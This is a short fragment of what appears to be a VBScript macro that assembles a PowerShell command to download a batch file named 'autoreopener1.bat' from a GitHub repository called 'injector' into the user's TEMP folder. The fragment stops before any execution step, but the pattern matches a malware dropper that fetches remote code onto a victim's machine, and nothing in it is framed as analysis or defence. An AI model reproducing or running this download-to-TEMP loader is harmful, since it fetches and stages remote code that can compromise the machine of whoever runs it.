...
psCommand = _
    ...
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/autoreopener1.bat' " & _
    "-OutFile ""$env:TEMP\autoreopener1.bat""; " & _
